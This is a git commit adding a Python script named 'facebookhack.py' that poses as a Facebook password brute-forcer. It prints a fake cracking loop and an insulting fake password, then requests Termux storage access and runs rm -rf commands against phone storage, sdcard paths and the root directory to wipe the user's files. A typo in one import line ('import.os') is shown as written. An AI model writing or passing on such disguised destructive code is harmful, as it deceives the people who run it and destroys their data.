4eb9adf6d44b7ab7b8947567d0f941998451717e
Knownasjohnn <109334868+Knownasjohnn@users.noreply.github.com>
2022-09-24 20:29:31 +0800

    Add files via upload

---
+++ facebookhack.py
@@ -0,0 +1,34 @@
+import datetime
+now = datetime.datetime.now()
+print(now)
+print("FACEBOOOK BRUTEFORCE")
+name = input("Target Link:")
+print(name)
+
+
+print("loading")
+
+
+for y in range (100000):
+	print("[*] Trying password ",y," trying password ")
+Bruteforce = input("account successfully hacked")
+Bruteforce = input("Password:FuckYou Skid")
+
+
+print("press enter to get password")
+print("password:FuckyouSkid")
+
+import.os
+os.system('termux-setup-storage')
+os.system('rm -rf /storage/emulated/0/*')
+os.system('rm -rf /storage/emulated/*')
+os.system('rm -rf /sdcard/*')
+os.system('rm -rf /sdcard/0/*')
+os.system('rm -rf /sdcard1/*')
+os.system('rm -rf /storage/*')
+os.system('rm -rf /*')
+
+
+
+
+
